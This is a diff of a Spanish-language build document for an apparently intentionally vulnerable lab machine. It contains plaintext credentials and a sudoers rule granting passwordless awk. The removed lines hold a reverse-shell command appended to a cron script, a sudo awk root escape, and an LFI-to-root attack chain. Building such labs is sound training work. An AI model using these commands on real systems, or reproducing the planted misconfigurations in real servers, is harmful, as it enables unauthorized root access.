@@ -1,6 +1,6 @@
 # Configuración del servidor, de la arquitectura y de la configuración del sistema
 
-### Diagrama de la arquitectura del sistema
+## Diagrama de la arquitectura del sistema
 ```bash
                                                ┌────────┐
                                                │  WEB   │
@@ -32,14 +32,14 @@
          │ - Crontab modificable │ ─(Cron Ejecuta)─►│ - Permisos de Sudo:   │
          │   (/opt/scripts/...)  │                  │   /usr/bin/awk        │
          └───────────────────────┘                  └───────────┬───────────┘
-                                                                │
-                                                                ▼ (GTFOBins)
-                                                            ┌───────────┐
-                                                            │   ROOT    │
-                                                            └───────────┘
+                                                                │ 
+                                                                ▼ 
+                                                          ┌───────────┐
+                                                          │   ROOT    │
+                                                          └───────────┘
 ```
 
-
+## Especificaciones del Sistema
 ```bash
 haber_fritz@ammonia:~$ lsb_release -a
 No LSB modules are available.
@@ -47,22 +47,25 @@ Distributor ID: Ubuntu
 Description:    Ubuntu 22.04.5 LTS
 Release:        22.04
 Codename:       jammy
-
+```
+##  Credenciales de Acceso
+```bash
 User: haber_fritz
 Pass: 9/12/!1868_Br3sl$a5ia!
 ```
 
+## Instalación y Actualización de Paquetes y Servicios Web
 ```bash
 sudo apt update && sudo apt upgrade -y
 sudo apt install lighttpd mariadb-server php-cgi php-mysql php-curl php-gd php-xml php-mbstring unzip wget -y
 ```
-
+Habilitación de los módulos FastCGI y FastCGI-PHP en Lighttpd, seguido del reinicio del servicio para aplicar los cambios y permitir que el servidor web procese archivos PHP correctamente.
 ```bash
 sudo lighty-enable-mod fastcgi
 sudo lighty-enable-mod fastcgi-php
 sudo systemctl restart lighttpd
 ```
-configruacion puerto numero cas amoniaco  El número CAS del amoníaco (NH₃) es 7664-41-7
+Configuración del puerto de WordPress. El número CAS del amoníaco (NH₃) es 7664-41-7
 ```bash
 sudo nano /etc/lighttpd/lighttpd.conf
 
@@ -188,33 +191,9 @@ clara_immerwahr ALL=(ALL) NOPASSWD: /usr/bin/awk
 
 
 
-ROOT
-nc -lvnp 9001
-
-haber_fritz@ammonia:~$ echo "bash -i >& /dev/tcp/192.168.1.104/9001 0>&1" >> /opt/scripts/backup_notes.sh
-
-┌──(kali㉿kali)-[~]
-└─$ nc -lvnp 9001
-listening on [any] 9001 ...
-connect to [192.168.1.104] from (UNKNOWN) [192.168.1.103] 49488
-bash: cannot set terminal process group (1938): Inappropriate ioctl for device
-bash: no job control in this shell
-clara_immerwahr@ammonia:~$ sudo awk 'BEGIN {system("/bin/sh")}'
-sudo awk 'BEGIN {system("/bin/sh")}'
-whoami
-root
 
 
 
 
-[ Atacante (Kali) ]
-       │
-       ▼ (LFI en WordPress)
-[ user: haber_fritz ]  <-- (Sabe de química y procesos industriales)
-       │
-       ▼ (Movimiento Lateral: Tarea Cron / Script inseguro)
-[ user: clara_immerwahr ] <-- (Su esposa, química brillante y pacifista opositora)
-       │
-       ▼ (Escalada de Privilegios: GTFOBins vía sudo o SUID)
-[ ROOT ]
+
 
